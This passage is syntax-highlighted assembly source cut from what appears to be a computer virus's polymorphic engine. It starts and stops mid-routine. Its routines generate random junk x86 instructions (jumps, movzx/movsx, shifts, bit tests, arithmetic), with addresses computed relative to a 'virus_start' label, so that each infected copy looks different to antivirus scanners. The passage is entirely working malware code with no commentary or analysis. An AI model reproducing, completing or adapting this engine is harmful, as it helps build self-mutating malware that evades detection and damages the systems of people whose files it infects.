        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_no_flags</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate unconditional jump ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">g_jump_u</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">         </span><span class="sc1">;   jmp __here</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;   --rnd data--</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;   --rnd data--</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">               </span><span class="sc1">;__here:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_gen_rnd_block</span><span class="sc0">   </span><span class="sc1">;   --next code--</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate conditional jump ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">g_jump_c</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">       </span><span class="sc1">;   jX __here</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">          </span><span class="sc1">;   --garbage--</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">          </span><span class="sc1">;   --garbage--</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">          </span><span class="sc1">;__here:</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">               </span><span class="sc1">;   --next code--</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_no_flags</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate movzx,movsx reg32/16,reg16/8 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">g_movzx_movsx_32</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">;movzx/movsx reg32,reg16</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0B7h</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__d_movzx32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0BFh</span><span class="sc0">
    </span><span class="sc5">__d_movzx32</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_reg</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_movzx_movsx_16</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">;movzx/movsx reg16,reg8</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc5">g_movzx_movsx_8</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">;movzx/movsx reg32,reg8</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0B6h</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__d_movzx32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0BEh</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__d_movzx32</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate rol/ror/rcl/rcr/shl/shr/sar reg,imm ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">g_rotate_shift32</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">;(r/s) reg32,imm8</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C1h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__do_rs_work</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_rotate_shift16</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">;(r/s) reg16,imm8</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">g_rotate_shift32</span><span class="sc0">

</span><span class="sc5">g_rotate_shift8</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">   </span><span class="sc1">;(r/s) reg8,imm8</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_rotate_shift8</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__do_rs_work</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc5">a_rotate_shift8</span><span class="sc4">:</span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__do_rs_work</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">;select r/s operation</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">end_rs_imm</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tbl_rs_imm</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_rs_imm</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate rol/ror/rcl/rcr/shl/shr/sar reg,reg8 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">g_rs_reg32reg8</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">;(r/s) reg32,reg8</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0D3h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;in fact, reg8 is always CL</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">   </span><span class="sc1">;because CPU allows only</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__do_rs_work</span><span class="sc0">        </span><span class="sc1">;this reg8</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_rs_reg16reg8</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">;(r/s) reg16,reg8 (CL)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">g_rs_reg32reg8</span><span class="sc0">

</span><span class="sc5">g_rs_reg8reg8</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">;(r/s) reg8,reg8 (CL)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_rs_reg8reg8</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0D266h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__do_rs_work</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc5">a_rs_reg8reg8</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate bt/bts/btr/btc reg32/16,(reg/imm)32/16 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">g_bt_regreg32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__do_bt_work</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_bt_regreg16</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0F66h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__do_bt_work</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__do_bt_work</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">end_bt_reg</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tbl_bt_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_bt_reg</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_reg</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_bit_test32</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0BA0Fh</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__do_bit_test_work</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_bit_test16</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">g_bit_test32</span><span class="sc0">

    </span><span class="sc5">__do_bit_test_work</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">end_bt_imm</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tbl_bt_imm</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_bt_imm</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate add/sub/xor/and/adc/sbb/or reg,reg ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">g_mathregreg32</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">;math reg32,reg32</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__do_math_regreg_work</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_mathregreg16</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">;math reg16,reg16</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">g_mathregreg32</span><span class="sc0">

</span><span class="sc5">g_mathregreg8</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">;math reg8,reg8</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_reg</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">g_mathregreg8</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_mathregreg8</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">end_math_reg</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tbl_math_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_math_reg</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">a_mathregreg8</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__do_math_regreg_work</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">end_math_reg</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tbl_math_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_math_reg</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_reg</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ set reg8 by flag ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">g_set_byte</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">
